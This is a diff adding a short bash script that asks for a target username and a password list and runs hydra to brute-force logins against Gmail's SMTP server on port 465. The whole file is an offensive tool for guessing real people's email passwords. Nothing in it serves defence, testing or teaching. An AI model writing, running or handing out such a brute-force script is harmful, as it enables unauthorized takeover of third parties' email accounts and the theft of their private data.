@@ -1,0 +1,9 @@
+#!/bin/bash
+
+echo -n "Target: ~$ "
+read host
+echo -n "Passlist: ~$ "
+read passwd
+
+hydra -S -l $host -P $passwd -e ns -V -s 465 smtp.gmail.com smtp
+
